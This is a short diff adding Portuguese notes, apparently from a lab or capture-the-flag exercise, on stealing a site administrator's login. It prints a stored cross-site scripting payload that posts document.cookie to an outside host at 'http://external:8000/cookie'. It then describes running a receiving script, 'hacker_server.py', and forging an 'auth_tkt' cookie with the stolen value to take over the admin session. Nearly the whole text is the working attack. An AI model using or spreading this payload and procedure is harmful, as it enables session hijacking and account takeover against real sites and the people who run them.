@@ -1,0 +1,12 @@
+Para roubar o login do admin, inserimos num post qualquer:
+<script>$.ajax({
+url: 'http://external:8000/cookie',
+type: 'POST',
+data: "username=Administrator&cookie=" + document.cookie,
+});
+</script>
+
+Depois executamos o codigo "hacker_server.py" e basta o admin abrir a pagina desse post 
+que vamos receber a cookie dele com o login
+Depois basta criarmos uma cookie com o nome "auth_tkt" (que ó que aparece antes do igual)
+e as letras e os números metemos no value
